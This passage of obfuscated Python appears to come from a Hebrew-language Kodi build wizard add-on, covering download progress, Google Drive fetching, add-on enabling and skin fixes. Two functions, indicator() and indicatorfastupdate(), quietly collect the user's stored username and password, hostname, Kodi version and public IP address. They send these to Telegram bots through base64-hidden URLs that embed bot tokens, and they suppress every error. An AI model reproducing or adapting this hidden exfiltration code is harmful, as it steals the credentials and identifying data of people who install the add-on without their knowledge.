        O0OO0O00O00O0OOOO =float (OO0O0O0O00O0OOO00 )/O0000O0OO0OO0O0OO #line:3484
        O0OO0O00O00O0OOOO =round (O0OO0O00O00O0OOOO *100 ,2 )#line:3485
        OO00OO0000OOOO000 =OO0O0O0O00O0OOO00 /(1024 *1024 )#line:3486
        O0OOOOOOOOOO00O0O =O0000O0OO0OO0O0OO /(1024 *1024 )#line:3487
        OO000OO00OOOO0000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OO00OO0000OOOO000 ,'teal',O0OOOOOOOOOO00O0O )#line:3488
        if (time .time ()-OOOO00O0000OO0O00 )>0 :#line:3489
          O0000O0OOOO0OOO0O =OO0O0O0O00O0OOO00 /(time .time ()-OOOO00O0000OO0O00 )#line:3490
          O0000O0OOOO0OOO0O =O0000O0OOOO0OOO0O /1024 #line:3491
        else :#line:3492
         O0000O0OOOO0OOO0O =0 #line:3493
        O00OOO0O0O0OOO00O ='KB'#line:3494
        if O0000O0OOOO0OOO0O >=1024 :#line:3495
           O0000O0OOOO0OOO0O =O0000O0OOOO0OOO0O /1024 #line:3496
           O00OOO0O0O0OOO00O ='MB'#line:3497
        if O0000O0OOOO0OOO0O >0 and not O0OO0O00O00O0OOOO ==100 :#line:3498
            OOO00O0OO000O00O0 =(O0000O0OO0OO0O0OO -OO0O0O0O00O0OOO00 )/O0000O0OOOO0OOO0O #line:3499
        else :#line:3500
            OOO00O0OO000O00O0 =0 #line:3501
        OOOO0O0OOO0OOOOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0000O0OOOO0OOO0O ,O00OOO0O0O0OOO00O )#line:3502
        OO00O0O0O0000OOOO .update (int (O0OO0O00O00O0OOOO ),"Downloading "+name ,OO000OO00OOOO0000 ,OOOO0O0OOO0OOOOO0 )#line:3504
  O000OO00000OOOOOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3507
  OO0O00000000000O0 .close ()#line:3509
  extract (O00OO0O000000O0O0 ,O000OO00000OOOOOO ,OO00O0O0O0000OOOO )#line:3511
  if os .path .exists (O000OO00000OOOOOO +'/scakemyer-script.quasar.burst'):#line:3512
    if os .path .exists (O000OO00000OOOOOO +'/script.quasar.burst'):#line:3513
     shutil .rmtree (O000OO00000OOOOOO +'/script.quasar.burst',ignore_errors =False )#line:3514
    os .rename (O000OO00000OOOOOO +'/scakemyer-script.quasar.burst',O000OO00000OOOOOO +'/script.quasar.burst')#line:3515
  if os .path .exists (O000OO00000OOOOOO +'/plugin.video.kmediatorrent-master'):#line:3517
    if os .path .exists (O000OO00000OOOOOO +'/plugin.video.kmediatorrent'):#line:3518
     shutil .rmtree (O000OO00000OOOOOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3519
    os .rename (O000OO00000OOOOOO +'/plugin.video.kmediatorrent-master',O000OO00000OOOOOO +'/plugin.video.kmediatorrent')#line:3520
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3521
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3522
  try :#line:3523
    os .remove (O00OO0O000000O0O0 )#line:3524
  except :#line:3525
    pass #line:3526
  OO00O0O0O0000OOOO .close ()#line:3527
def dis_or_enable_addon (OOO000O0O0OOO00OO ,O00000O0O0O00OOO0 ,enable ="true"):#line:3528
    import json #line:3529
    O00OO00000O0000OO ='"%s"'%OOO000O0O0OOO00OO #line:3530
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO000O0O0OOO00OO )and enable =="true":#line:3531
        logging .warning ('already Enabled')#line:3532
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO000O0O0OOO00OO )#line:3533
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO000O0O0OOO00OO )and enable =="false":#line:3534
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO000O0O0OOO00OO )#line:3535
    else :#line:3536
        O00OOOOOOOOOOO0OO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00OO00000O0000OO ,enable )#line:3537
        O00O0OO00OOO000OO =xbmc .executeJSONRPC (O00OOOOOOOOOOO0OO )#line:3538
        OO00000000O0O0OOO =json .loads (O00O0OO00OOO000OO )#line:3539
        if enable =="true":#line:3540
            xbmc .log ("### Enabled %s, response = %s"%(OOO000O0O0OOO00OO ,OO00000000O0O0OOO ))#line:3541
        else :#line:3542
            xbmc .log ("### Disabled %s, response = %s"%(OOO000O0O0OOO00OO ,OO00000000O0O0OOO ))#line:3543
    if O00000O0O0O00OOO0 =='auto':#line:3544
     return True #line:3545
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3546
def chunk_report (OOO0O00000OO0000O ,O00O000OOO00O0O00 ,OO0O0O0OOO00000OO ):#line:3547
   OO00OOO0O0OO000O0 =float (OOO0O00000OO0000O )/OO0O0O0OOO00000OO #line:3548
   OO00OOO0O0OO000O0 =round (OO00OOO0O0OO000O0 *100 ,2 )#line:3549
   if OOO0O00000OO0000O >=OO0O0O0OOO00000OO :#line:3551
      sys .stdout .write ('\n')#line:3552
def chunk_read (O0OOOO000O000000O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3554
   import time #line:3555
   O0O00O0O00OOOOOOO =int (filesize )*1000000 #line:3556
   OOO00000OOO000O00 =0 #line:3558
   OOO000O0O0OO00000 =time .time ()#line:3559
   O0000O00OO0000000 =0 #line:3560
   logging .warning ('Downloading')#line:3562
   with open (destination ,"wb")as OO0O0O0O0OOOOOO00 :#line:3563
    while 1 :#line:3564
      OO000OO0OO000O000 =time .time ()-OOO000O0O0OO00000 #line:3565
      OO0000O000O00OOO0 =int (O0000O00OO0000000 *chunk_size )#line:3566
      O0OO0O000O00O0000 =O0OOOO000O000000O .read (chunk_size )#line:3567
      OO0O0O0O0OOOOOO00 .write (O0OO0O000O00O0000 )#line:3568
      OO0O0O0O0OOOOOO00 .flush ()#line:3569
      OOO00000OOO000O00 +=len (O0OO0O000O00O0000 )#line:3570
      OOOO0O0O0OO0OOOOO =float (OOO00000OOO000O00 )/O0O00O0O00OOOOOOO #line:3571
      OOOO0O0O0OO0OOOOO =round (OOOO0O0O0OO0OOOOO *100 ,2 )#line:3572
      if int (OO000OO0OO000O000 )>0 :#line:3573
        O0000O0O00000OOOO =int (OO0000O000O00OOO0 /(1024 *OO000OO0OO000O000 ))#line:3574
      else :#line:3575
         O0000O0O00000OOOO =0 #line:3576
      if O0000O0O00000OOOO >1024 and not OOOO0O0O0OO0OOOOO ==100 :#line:3577
          O0OOOOO0000O0O0OO =int (((O0O00O0O00OOOOOOO -OO0000O000O00OOO0 )/1024 )/(O0000O0O00000OOOO ))#line:3578
      else :#line:3579
          O0OOOOO0000O0O0OO =0 #line:3580
      if O0OOOOO0000O0O0OO <0 :#line:3581
        O0OOOOO0000O0O0OO =0 #line:3582
      dp .update (int (OOOO0O0O0OO0OOOOO ),name +"[B]מוריד: [/B]","\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OOOO0O0O0OO0OOOOO ,OO0000O000O00OOO0 /(1024 *1024 ),O0O00O0O00OOOOOOO /(1000 *1000 ),O0000O0O00000OOOO ),'[COLOR aqua]%02d:%02d[/COLOR][B]זמן שנותר: [/B]'%divmod (O0OOOOO0000O0O0OO ,60 ))#line:3583
      if dp .iscanceled ():#line:3584
         dp .close ()#line:3585
         break #line:3586
      if not O0OO0O000O00O0000 :#line:3587
         break #line:3588
      if report_hook :#line:3590
         report_hook (OOO00000OOO000O00 ,chunk_size ,O0O00O0O00OOOOOOO )#line:3591
      O0000O00OO0000000 +=1 #line:3592
   logging .warning ('END Downloading')#line:3593
   return OOO00000OOO000O00 #line:3594
def googledrive_download (OO0O0OOO0O00O00OO ,O0OOOOOOO00O0O000 ,OOOOO000OOOOOOO00 ,O0O0OOOO00O0OO00O ):#line:3596
    OO0O0O00O0O0OO0OO =[]#line:3600
    OOOO000OO0O0O00O0 =OO0O0OOO0O00O00OO .split ('=')#line:3601
    OO0O0OOO0O00O00OO =OOOO000OO0O0O00O0 [len (OOOO000OO0O0O00O0 )-1 ]#line:3602
    def OO0OOOO00OOO00000 (OO0OO0000000O0000 ):#line:3604
        for O00OOO00OOOOOO00O in OO0OO0000000O0000 :#line:3606
            logging .warning ('cookie.name')#line:3607
            logging .warning (O00OOO00OOOOOO00O .name )#line:3608
            OOO00OOOOOO0O0O00 =O00OOO00OOOOOO00O .value #line:3609
            if 'download_warning'in O00OOO00OOOOOO00O .name :#line:3610
                logging .warning (O00OOO00OOOOOO00O .value )#line:3611
                logging .warning ('cookie.value')#line:3612
                return O00OOO00OOOOOO00O .value #line:3613
            return OOO00OOOOOO0O0O00 #line:3614
        return None #line:3616
    def O0OO00OOOOOOO00O0 (OO0OO00OO00OO0OOO ,O0O000OO00OO0OO00 ):#line:3618
        O00OO00O0OOO00O00 =32768 #line:3620
        O0OOO0OO00OOO00OO =time .time ()#line:3621
        with open (O0O000OO00OO0OO00 ,"wb")as OOOO00O000OO00O0O :#line:3623
            OOO00O0OOOOOOOOOO =1 #line:3624
            OO00OOOOOO00O0O00 =32768 #line:3625
            try :#line:3626
                O0OOOO00000O00O0O =int (OO0OO00OO00OO0OOO .headers .get ('content-length'))#line:3627
                print ('file total size :',O0OOOO00000O00O0O )#line:3628
            except TypeError :#line:3629
                print ('using dummy length !!!')#line:3630
                O0OOOO00000O00O0O =int (O0O0OOOO00O0OO00O )*1000000 #line:3631
            for O0OOO000O00OO0000 in OO0OO00OO00OO0OOO .iter_content (O00OO00O0OOO00O00 ):#line:3632
                if O0OOO000O00OO0000 :#line:3633
                    OOOO00O000OO00O0O .write (O0OOO000O00OO0000 )#line:3634
                    OOOO00O000OO00O0O .flush ()#line:3635
                    OO0OOOOOO00OOOOO0 =time .time ()-O0OOO0OO00OOO00OO #line:3636
                    O0OO000O0OOO0OO00 =int (OOO00O0OOOOOOOOOO *OO00OOOOOO00O0O00 )#line:3637
                    if OO0OOOOOO00OOOOO0 ==0 :#line:3638
                        OO0OOOOOO00OOOOO0 =0.1 #line:3639
                    O0OOOO000000OO00O =int (O0OO000O0OOO0OO00 /(1024 *OO0OOOOOO00OOOOO0 ))#line:3640
                    OO000O0OOO0OO0OO0 =int (OOO00O0OOOOOOOOOO *OO00OOOOOO00O0O00 *100 /O0OOOO00000O00O0O )#line:3641
                    if O0OOOO000000OO00O >1024 and not OO000O0OOO0OO0OO0 ==100 :#line:3642
                      OOOOO0000O0OO000O =int (((O0OOOO00000O00O0O -O0OO000O0OOO0OO00 )/1024 )/(O0OOOO000000OO00O ))#line:3643
                    else :#line:3644
                      OOOOO0000O0OO000O =0 #line:3645
                    OOOOO000OOOOOOO00 .update (int (OO000O0OOO0OO0OO0 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO000O0OOO0OO0OO0 ,O0OO000O0OOO0OO00 /(1024 *1024 ),O0OOOO00000O00O0O /(1000 *1000 ),O0OOOO000000OO00O ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OOOOO0000O0OO000O ,60 ))#line:3647
                    OOO00O0OOOOOOOOOO +=1 #line:3648
                    if OOOOO000OOOOOOO00 .iscanceled ():#line:3649
                     OOOOO000OOOOOOO00 .close ()#line:3650
                     break #line:3651
    OOOOOO0O00OOOOOO0 ="https://docs.google.com/uc?export=download"#line:3652
    import urllib2 #line:3657
    import cookielib #line:3658
    from cookielib import CookieJar #line:3660
    OO000000OO0O0OO0O =CookieJar ()#line:3662
    O000000OO0O0O0OO0 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (OO000000OO0O0OO0O ))#line:3663
    OOO0O0O0O00OOO0O0 ={'id':OO0O0OOO0O00O00OO }#line:3665
    O0OOO0OO00000O0OO =urllib .urlencode (OOO0O0O0O00OOO0O0 )#line:3666
    logging .warning (OOOOOO0O00OOOOOO0 +'&'+O0OOO0OO00000O0OO )#line:3667
    OO0OOO0OOO0OOO0OO =O000000OO0O0O0OO0 .open (OOOOOO0O00OOOOOO0 +'&'+O0OOO0OO00000O0OO )#line:3668
    OO0O00OOOOOO00000 =OO0OOO0OOO0OOO0OO .read ()#line:3669
    for O0OO0O00OO0000O0O in OO000000OO0O0OO0O :#line:3671
         logging .warning (O0OO0O00OO0000O0O )#line:3672
    O0OOOO0OO00O00OOO =OO0OOOO00OOO00000 (OO000000OO0O0OO0O )#line:3673
    logging .warning (O0OOOO0OO00O00OOO )#line:3674
    if O0OOOO0OO00O00OOO :#line:3675
        OOO000O0000OOOOOO ={'id':OO0O0OOO0O00O00OO ,'confirm':O0OOOO0OO00O00OOO }#line:3676
        OOO0000OO000O00O0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:3677
        O0OOO0OO00000O0OO =urllib .urlencode (OOO000O0000OOOOOO )#line:3678
        OO0OOO0OOO0OOO0OO =O000000OO0O0O0OO0 .open (OOOOOO0O00OOOOOO0 +'&'+O0OOO0OO00000O0OO )#line:3679
        chunk_read (OO0OOO0OOO0OOO0OO ,report_hook =chunk_report ,dp =OOOOO000OOOOOOO00 ,destination =O0OOOOOOO00O0O000 ,filesize =O0O0OOOO00O0OO00O )#line:3680
    return (OO0O0O00O0O0OO0OO )#line:3684
def kodi17Fix ():#line:3685
	OO0O00OOOO00O000O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3686
	OO000O0OOOO0O0000 =[]#line:3687
	for OO0O000OO0O0OO0O0 in sorted (OO0O00OOOO00O000O ,key =lambda OO00O0OOO0OOO00OO :OO00O0OOO0OOO00OO ):#line:3688
		O0O000000OOO00OO0 =os .path .join (OO0O000OO0O0OO0O0 ,'addon.xml')#line:3689
		if os .path .exists (O0O000000OOO00OO0 ):#line:3690
			O0O00OOOOOOO00O0O =OO0O000OO0O0OO0O0 .replace (ADDONS ,'')[1 :-1 ]#line:3691
			O0O0OOO0OOO0OOO0O =open (O0O000000OOO00OO0 )#line:3692
			OOOOOOOOOOO00OO00 =O0O0OOO0OOO0OOO0O .read ()#line:3693
			O0OO0OOOOOOO0O000 =parseDOM (OOOOOOOOOOO00OO00 ,'addon',ret ='id')#line:3694
			O0O0OOO0OOO0OOO0O .close ()#line:3695
			try :#line:3696
				O000O0O00000OO000 =xbmcaddon .Addon (id =O0OO0OOOOOOO0O000 [0 ])#line:3697
			except :#line:3698
				try :#line:3699
					log ("%s was disabled"%O0OO0OOOOOOO0O000 [0 ],xbmc .LOGDEBUG )#line:3700
					OO000O0OOOO0O0000 .append (O0OO0OOOOOOO0O000 [0 ])#line:3701
				except :#line:3702
					try :#line:3703
						log ("%s was disabled"%O0O00OOOOOOO00O0O ,xbmc .LOGDEBUG )#line:3704
						OO000O0OOOO0O0000 .append (O0O00OOOOOOO00O0O )#line:3705
					except :#line:3706
						if len (O0OO0OOOOOOO0O000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O0O00OOOOOOO00O0O ,xbmc .LOGERROR )#line:3707
						else :log ("Unabled to enable: %s"%OO0O000OO0O0OO0O0 ,xbmc .LOGERROR )#line:3708
	if len (OO000O0OOOO0O0000 )>0 :#line:3709
		OOOOO000OOO0OO0O0 =0 #line:3710
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3711
		for O00OO00000OO0OO00 in OO000O0OOOO0O0000 :#line:3712
			OOOOO000OOO0OO0O0 +=1 #line:3713
			OO0OOO0OO000OO000 =int (percentage (OOOOO000OOO0OO0O0 ,len (OO000O0OOOO0O0000 )))#line:3714
			DP .update (OO0OOO0OO000OO000 ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00000OO0OO00 ))#line:3715
			addonDatabase (O00OO00000OO0OO00 ,1 )#line:3716
			if DP .iscanceled ():break #line:3717
		if DP .iscanceled ():#line:3718
			DP .close ()#line:3719
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3720
			sys .exit ()#line:3721
		DP .close ()#line:3722
	forceUpdate ()#line:3723
def indicator ():#line:3725
       try :#line:3726
          import json #line:3727
          wiz .log ('FRESH MESSAGE')#line:3728
          OO000OO000O0O00OO =(ADDON .getSetting ("user"))#line:3729
          OO00O000O00OO0O00 =(ADDON .getSetting ("pass"))#line:3730
          O00O000OO0O0OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3731
          O00OOOO000OO000OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3732
          O0000OO00OO000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3733
          O0O000OOOO0O0O0OO =str (json .loads (O0000OO00OO000OO0 )['ip'])#line:3734
          O0OO0OOOOO00OOO00 =OO000OO000O0O00OO #line:3735
          OOOOOOOO00000OO0O =OO00O000O00OO0O00 #line:3736
          import socket #line:3737
          O0000OO00OO000OO0 =urllib2 .urlopen (O00OOOO000OO000OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+O0OO0OOOOO00OOO00 +' - '+OOOOOOOO00000OO0O +' - '+O00O000OO0O0OOO00 +' - '+O0O000OOOO0O0O0OO ).readlines ()#line:3738
       except :pass #line:3740
def indicatorfastupdate ():#line:3742
       try :#line:3743
          import json #line:3744
          wiz .log ('FRESH MESSAGE')#line:3745
          OOOO00O00O0O00OOO =(ADDON .getSetting ("user"))#line:3746
          OOOOOO0O0O0OO0OO0 =(ADDON .getSetting ("pass"))#line:3747
          O0OO0O0O0OOOOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3748
          OOO00OOOOO00OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3750
          OO0OOO00OO0OOOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3751
          O00OO00OOOO00O00O =str (json .loads (OO0OOO00OO0OOOOO0 )['ip'])#line:3752
          OO0000O000O0OOO0O =OOOO00O00O0O00OOO #line:3753
          OOO000O0000OOO0OO =OOOOOO0O0O0OO0OO0 #line:3754
          import socket #line:3756
          OO0OOO00OO0OOOOO0 =urllib2 .urlopen (OOO00OOOOO00OO0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0000O000O0OOO0O +' - '+OOO000O0000OOO0OO +' - '+O0OO0O0O0OOOOO0O0 +' - '+O00OO00OOOO00O00O ).readlines ()#line:3757
       except :pass #line:3759
def skinfix18 ():#line:3761
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3762
		OOO0O00OOOOOOO0OO =wiz .workingURL (SKINID18DDONXML )#line:3763
		if OOO0O00OOOOOOO0OO ==True :#line:3764
			OO00000OO000OOO0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3765
			if len (OO00000OO000OOO0O )>0 :#line:3766
				O00OO000OO0O0O000 ='%s-%s.zip'%(SKINID18 ,OO00000OO000OOO0O [0 ])#line:3767
				O00O00OO0O00O0O00 =wiz .workingURL (SKIN18ZIPURL +O00OO000OO0O0O000 )#line:3768
				if O00O00OO0O00O0O00 ==True :#line:3769
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3770
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3771
					O00O00000OO00OOOO =os .path .join (PACKAGES ,O00OO000OO0O0O000 )#line:3772
					try :os .remove (O00O00000OO00OOOO )#line:3773
					except :pass #line:3774
					downloader .download (SKIN18ZIPURL +O00OO000OO0O0O000 ,O00O00000OO00OOOO ,DP )#line:3775
					extract .all (O00O00000OO00OOOO ,HOME ,DP )#line:3776
					try :#line:3777
						O0000OOOOOO0000OO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3778
						O0O000O000OOO0000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3779
						os .rename (O0000OOOOOO0000OO ,O0O000O000OOO0000 )#line:3780
					except :#line:3781
						pass #line:3782
					try :#line:3783
						OO0O0OOO0OO000000 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O000O0OOOO0OOOOOO =OO0O0OOO0OO000000 .read ();OO0O0OOO0OO000000 .close ()#line:3784
						O0OOO0O0OO0OO000O =wiz .parseDOM (O000O0OOOO0OOOOOO ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3785
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OOO0O0OO0OO000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3786
					except :#line:3787
						pass #line:3788
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3789
					DP .close ()#line:3790
					xbmc .sleep (500 )#line:3791
					wiz .forceUpdate (True )#line:3792
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3793
				else :#line:3794
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3795
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O00O00OO0O00O0O00 ,xbmc .LOGERROR )#line:3796
			else :#line:3797
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3798
		else :#line:3799
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3800
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3801
def skinfix17 ():#line:3802
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3803
		O0O00O0OO00OOOO0O =wiz .workingURL (SKINID17DDONXML )#line:3804
		if O0O00O0OO00OOOO0O ==True :#line:3805
			O0O0O00000000OO00 =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3806
			if len (O0O0O00000000OO00 )>0 :#line:3807
				O0OO0OOOOO0000OOO ='%s-%s.zip'%(SKINID17 ,O0O0O00000000OO00 [0 ])#line:3808
				O0000O0OOOO000OO0 =wiz .workingURL (SKIN17ZIPURL +O0OO0OOOOO0000OOO )#line:3809
				if O0000O0OOOO000OO0 ==True :#line:3810
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3811
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3812
					OO0OO0O000OOO000O =os .path .join (PACKAGES ,O0OO0OOOOO0000OOO )#line:3813
					try :os .remove (OO0OO0O000OOO000O )#line:3814
					except :pass #line:3815
					downloader .download (SKIN17ZIPURL +O0OO0OOOOO0000OOO ,OO0OO0O000OOO000O ,DP )#line:3816
					extract .all (OO0OO0O000OOO000O ,HOME ,DP )#line:3817
					try :#line:3818
						OO0OO0O0O0OO00OOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3819
						OO00OOO0OO0OOOO00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3820
						os .rename (OO0OO0O0O0OO00OOO ,OO00OOO0OO0OOOO00 )#line:3821
					except :#line:3822
						pass #line:3823
					try :#line:3824
						OOO0000O000O000O0 =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO0OO0OO0OOO00OO0 =OOO0000O000O000O0 .read ();OOO0000O000O000O0 .close ()#line:3825
						OOOO0000O0000O0O0 =wiz .parseDOM (OO0OO0OO0OOO00OO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3826
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOOO0000O0000O0O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3827
					except :#line:3828
						pass #line:3829
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3830
					DP .close ()#line:3831
					xbmc .sleep (500 )#line:3832
					wiz .forceUpdate (True )#line:3833
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3834
				else :#line:3835
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3836
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0000O0OOOO000OO0 ,xbmc .LOGERROR )#line:3837
			else :#line:3838
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3839
		else :#line:3840
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3841
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3842
def fix17update ():#line:3843
	if KODIV >=17 and KODIV <18 :#line:3844
		wiz .kodi17Fix ()#line:3845
		xbmc .sleep (4000 )#line:3846
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3847
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3848
		fixfont ()#line:3849
		OOOO0O0O00OOO0O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3850
		try :#line:3852
			O00O00O00O0OO0O00 =open (OOOO0O0O00OOO0O00 ,'r')#line:3853
			OOO0OO00000OO0000 =O00O00O00O0OO0O00 .read ()#line:3854
			O00O00O00O0OO0O00 .close ()#line:3855
			O0O0OO0OOO0OOO0O0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3856
			OOOO0OO0OOOO0O000 =re .compile (O0O0OO0OOO0OOO0O0 ).findall (OOO0OO00000OO0000 )[0 ]#line:3857
			O00O00O00O0OO0O00 =open (OOOO0O0O00OOO0O00 ,'w')#line:3858
			O00O00O00O0OO0O00 .write (OOO0OO00000OO0000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO0OO0OOOO0O000 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3859
			O00O00O00O0OO0O00 .close ()#line:3860
		except :#line:3861
				pass #line:3862
		wiz .kodi17Fix ()#line:3863
		OOOO0O0O00OOO0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3864
		try :#line:3865
			O00O00O00O0OO0O00 =open (OOOO0O0O00OOO0O00 ,'r')#line:3866
			OOO0OO00000OO0000 =O00O00O00O0OO0O00 .read ()#line:3867
			O00O00O00O0OO0O00 .close ()#line:3868
			O0O0OO0OOO0OOO0O0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3869
			OOOO0OO0OOOO0O000 =re .compile (O0O0OO0OOO0OOO0O0 ).findall (OOO0OO00000OO0000 )[0 ]#line:3870
			O00O00O00O0OO0O00 =open (OOOO0O0O00OOO0O00 ,'w')#line:3871
			O00O00O00O0OO0O00 .write (OOO0OO00000OO0000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO0OO0OOOO0O000 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3872
			O00O00O00O0OO0O00 .close ()#line:3873
		except :#line:3874
				pass #line:3875
		swapSkins ('skin.Premium.mod')#line:3876
def fix18update ():#line:3878
	if KODIV >=18 :#line:3879
		xbmc .sleep (4000 )#line:3880
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3881
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3882
		fixfont ()#line:3883
		O000O0000O00O000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3884
		try :#line:3885
			O0OO00OOOO0O0OO00 =open (O000O0000O00O000O ,'r')#line:3886
			OO00O0O0OO00OO0OO =O0OO00OOOO0O0OO00 .read ()#line:3887
			O0OO00OOOO0O0OO00 .close ()#line:3888
			OO00O00O0000OO00O ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3889
			O0O00O0O0O00OO000 =re .compile (OO00O00O0000OO00O ).findall (OO00O0O0OO00OO0OO )[0 ]#line:3890
